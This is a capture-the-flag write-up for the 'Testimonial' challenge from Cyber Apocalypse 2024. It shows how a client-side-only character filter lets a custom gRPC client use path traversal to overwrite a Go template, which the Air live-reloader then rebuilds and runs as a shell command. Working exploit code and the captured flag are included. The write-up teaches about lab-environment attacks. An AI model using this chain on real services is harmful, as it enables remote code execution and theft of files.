---
title: "Testimonial - Cyber Apocalypse 2024: Hacker Royale"
category: "misc"
subcategory: "lfi"
type: "writeup"
tags: ["misc", "path-traversal", "golang", "sprintf", "grpc", "symlink", "lfi", "cyber-apocalypse-2024-hacker-r", "cyber-apocalypse-2024-hacker-royal", "2024", "ctf-writeup"]
summary: "We are given the following website:"
source:
  name: "CTFtime writeup #38998"
  url: "https://ctftime.org/writeup/38998"
original_source: "https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/testimonial/"
ctf:
  name: "Cyber Apocalypse 2024: Hacker Royale"
  year: 2024
  challenge: "Testimonial"
---

## Metadata

- **CTF:** Cyber Apocalypse 2024: Hacker Royale
- **Task:** Testimonial
- **Author team:** Watch4Hack
- **CTFtime:** <https://ctftime.org/writeup/38998>
- **Original writeup:** <https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/testimonial/>

---
We are given the following website:

![Testimonial 1](https://7rocky.github.io/images/other/HTB%20Cyber%20Apocalypse%202024/Testimonial-1.webp)

Moreover, we have a gRPC endpoint at `94.237.49.166:58578`.

We are also given the source code of the project in Go.

## Source code analysis

This is the main file (`main.go`):

`

```
    package main
    
    import (
            "embed"
            "htbchal/handler"
            "htbchal/pb"
            "log"
            "net"
            "net/http"
    
            "github.com/go-chi/chi/v5"
            "google.golang.org/grpc"
    )
    
    //go:embed public
    var FS embed.FS
    
    func main() {
            router := chi.NewMux()
    
            router.Handle("/*", http.StripPrefix("/", http.FileServer(http.FS(FS))))
            router.Get("/", handler.MakeHandler(handler.HandleHomeIndex))
            go startGRPC()
            log.Fatal(http.ListenAndServe(":1337", router))
    }
    
    type server struct {
            pb.RickyServiceServer
    }
    
    func startGRPC() error {
            lis, err := net.Listen("tcp", ":50045")
            if err != nil {
                    log.Fatal(err)
            }
            s := grpc.NewServer()
    
            pb.RegisterRickyServiceServer(s, &server{})
            if err := s.Serve(lis); err != nil {
                    log.Fatal(err)
            }
            return nil
    }
```

`

As can be seen, it uses a handler to manage HTTP requests (`handler/home.go`):

`

```
    package handler
    
    import (
            "htbchal/client"
            "htbchal/view/home"
            "net/http"
    )
    
    func HandleHomeIndex(w http.ResponseWriter, r *http.Request) error {
            customer := r.URL.Query().Get("customer")
            testimonial := r.URL.Query().Get("testimonial")
            if customer != "" && testimonial != "" {
                    c, err := client.GetClient()
                    if err != nil {
                            http.Error(w, err.Error(), http.StatusInternalServerError)
    
                    }
    
                    if err := c.SendTestimonial(customer, testimonial); err != nil {
                            http.Error(w, err.Error(), http.StatusInternalServerError)
    
                    }
            }
            return home.Index().Render(r.Context(), w)
    }
```

`

This endpoint uses a function `SendTestimonial` from a gRPC client (`client/client.go`):

`

```
    package client
    
    import (
            "context"
            "fmt"
            "htbchal/pb"
            "strings"
            "sync"
    
            "google.golang.org/grpc"
    )
    
    var (
            grpcClient *Client
            mutex      *sync.Mutex
    )
    
    func init() {
            grpcClient = nil
            mutex = &sync.Mutex{}
    }
    
    type Client struct {
            pb.RickyServiceClient
    }
    
    func GetClient() (*Client, error) {
            mutex.Lock()
            defer mutex.Unlock()
    
            if grpcClient == nil {
                    conn, err := grpc.Dial(fmt.Sprintf("127.0.0.1%s", ":50045"), grpc.WithInsecure())
                    if err != nil {
                            return nil, err
                    }
    
                    grpcClient = &Client{pb.NewRickyServiceClient(conn)}
            }
    
            return grpcClient, nil
    }
    
    func (c *Client) SendTestimonial(customer, testimonial string) error {
            ctx := context.Background()
            // Filter bad characters.
            for _, char := range []string{"/", "\\", ":", "*", "?", "\"", "<", ">", "|", "."} {
                    customer = strings.ReplaceAll(customer, char, "")
            }
    
            _, err := c.SubmitTestimonial(ctx, &pb.TestimonialSubmission{Customer: customer, Testimonial: testimonial})
            return err
    }
```

`

And this client connects to the servers gRPC endpoint, which is managed by `grpc.go`:

`

```
    package main
    
    import (
            "context"
            "errors"
            "fmt"
            "htbchal/pb"
            "os"
    )
    
    func (s *server) SubmitTestimonial(ctx context.Context, req *pb.TestimonialSubmission) (*pb.GenericReply, error) {
            if req.Customer == "" {
                    return nil, errors.New("Name is required")
            }
            if req.Testimonial == "" {
                    return nil, errors.New("Content is required")
            }
    
            err := os.WriteFile(fmt.Sprintf("public/testimonials/%s", req.Customer), []byte(req.Testimonial), 0644)
            if err != nil {
                    return nil, err
            }
    
            return &pb.GenericReply{Message: "Testimonial submitted successfully"}, nil
    }
```

`

So, we can use this website to write testimonials. These testimonials are sent via HTTP, but under the hood, the HTTP handler calls a gRPC client to send the testimonial to the gRPC server.

## Exploitation

We can see that the gRPC server saves the file with the following sentence:

`

```
            err := os.WriteFile(fmt.Sprintf("public/testimonials/%s", req.Customer), []byte(req.Testimonial), 0644)
            if err != nil {
                    return nil, err
            }
```

`

We control the variable `req.Customer`, so we can use Directory Traversal to write the testimonial (`req.Testimonial`) at an arbitrary path of the filesystem.

The problem is that the gRPC client applies a very strict filter:

`

```
    func (c *Client) SendTestimonial(customer, testimonial string) error {
            ctx := context.Background()
            // Filter bad characters.
            for _, char := range []string{"/", "\\", ":", "*", "?", "\"", "<", ">", "|", "."} {
                    customer = strings.ReplaceAll(customer, char, "")
            }
    
            _, err := c.SubmitTestimonial(ctx, &pb.TestimonialSubmission{Customer: customer, Testimonial: testimonial})
            return err
    }
```

`

However, we won’t need to bypass the filter. The problem here is that the filter is in the client, not in the server. Therefore, we can simply use our own gRPC client to send a malicious payload to the server, since the gRPC port is open.

So, what can we write?

### Arbitrary file write

We know from the `entrypoint.sh` that the flag filename is random, so we need to achieve remote code execution:

`

```
    #!/bin/sh
    
    # Change flag name
    mv /flag.txt /flag$(cat /dev/urandom | tr -cd "a-f0-9" | head -c 10).txt
    
    # Secure entrypoint
    chmod 600 /entrypoint.sh
    
    # Start application
    air
```

`

Here we also have a key point, which is [air](https://github.com/cosmtrek/air). This is a tool that allows live-reloading for Go projects, so it just restarts the server whenever a Go file is modified. With this, we can do a lot of things.

For instance, we will try execute the following command:

`

```
    cat /fl* > /challenge/public/testimonials/flag.txt
```

`

There is an `air` configuration file (`.air.toml`):

`

```
    root = "."
    tmp_dir = "tmp"
    
    [build]
      bin = "./tmp/main"
      cmd = "templ generate && go build -o ./tmp/main ."
      
      delay = 20
      exclude_dir = ["assets", "tmp", "vendor"]
      exclude_file = []
      exclude_regex = [".*_templ.go"]
      exclude_unchanged = false
      follow_symlink = false
      full_bin = ""
      include_dir = []
      include_ext = ["tpl", "tmpl", "templ", "html"]
      kill_delay = "0s"
      log = "build-errors.log"
      send_interrupt = false
      stop_on_error = true
    
    [color]
      app = ""
      build = "yellow"
      main = "magenta"
      runner = "green"
      watcher = "cyan"
    
    [log]
      time = false
    
    [misc]
      clean_on_exit = false
```

`

Here we see that it watches changes on files with `tpl`, `tmpl`, `templ` or `html` extensions, so we can simply modify a template like `views/home.templ` and add the above command:

`

```
    package layout
    
    // import "htbchal/view/ui"
    import "os/exec"
    
    func exploit() string {
    	exec.Command("/bin/sh", "-c", "cat /fl* > /challenge/public/testimonials/flag.txt").Run()
    	return ""
    }
    
    templ App(nav bool) {
    	{exploit()}
    
    	<!DOCTYPE html>
    	<html lang="en">
    		<head>
    			<title>Official website of the Fray</title>
    			<meta charset="UTF-8"/>
    			<link rel="stylesheet" href="/public/css/main.css"/>
    			<link rel="stylesheet" href="/public/css/bootstrap.min.css"/>
    			<script type="text/plain" src="/public/bootstrap.min.js"></script>
    		</head>
    		{ children... }
    	</html>
    }
```

`

Now, we can create this main file (`solve.go`):

`

```
    package main
    
    import (
            "htbchal/client"
    )
    
    func main() {
            c, _ := client.GetClient()
            c.SendTestimonial("../../view/layout/app.templ", `package layout
            
    // import "htbchal/view/ui"
    import "os/exec"
    
    func exploit() string {
            exec.Command("/bin/sh", "-c", "cat /fl* > /challenge/public/testimonials/flag.txt").Run()
            return ""
    }
    
    templ App(nav bool) {
            {exploit()}
    
            <!DOCTYPE html>
            <html lang="en">
                    <head>
                            <title>Official website of the Fray</title>
                            <meta charset="UTF-8"/>
                            <link rel="stylesheet" href="/public/css/main.css"/>
                            <link rel="stylesheet" href="/public/css/bootstrap.min.css"/>
                            <script type="text/plain" src="/public/bootstrap.min.js"></script>
                    </head>
                    { children... }
            </html>
    }
    `)
    }
```

`

And copy the `client/client.go` file, but removing the checks:

`

```
    package client
    
    import (
            "context"
            "fmt"
            "htbchal/pb"
            "os"
            "sync"
    
            "google.golang.org/grpc"
    )
    
    var (
            grpcClient *Client
            mutex      *sync.Mutex
    )
    
    func init() {
            grpcClient = nil
            mutex = &sync.Mutex{}
    }
    
    type Client struct {
            pb.RickyServiceClient
    }
    
    func GetClient() (*Client, error) {
            mutex.Lock()
            defer mutex.Unlock()
    
            if grpcClient == nil {
                    conn, err := grpc.Dial(fmt.Sprintf(os.Args[1]), grpc.WithInsecure())
                    if err != nil {
                            return nil, err
                    }
    
                    grpcClient = &Client{pb.NewRickyServiceClient(conn)}
            }
    
            return grpcClient, nil
    }
    
    func (c *Client) SendTestimonial(customer, testimonial string) error {
            ctx := context.Background()
            // Filter bad characters.
            // for _, char := range []string{"/", "\\", ":", "*", "?", "\"", "<", ">", "|", "."} {
            //      customer = strings.ReplaceAll(customer, char, "")
            // }
    
            _, err := c.SubmitTestimonial(ctx, &pb.TestimonialSubmission{Customer: customer, Testimonial: testimonial})
            return err
    }
```

`

## Flag

At this point, we simply run the Go project:

`

```
    $ go run solve.go 94.237.49.166:58578
```

`

And we will see the flag on the website:

![Testimonial 2](https://7rocky.github.io/images/other/HTB%20Cyber%20Apocalypse%202024/Testimonial-2.webp)

`

```
    HTB{w34kly_t35t3d_t3mplate5}
```

`
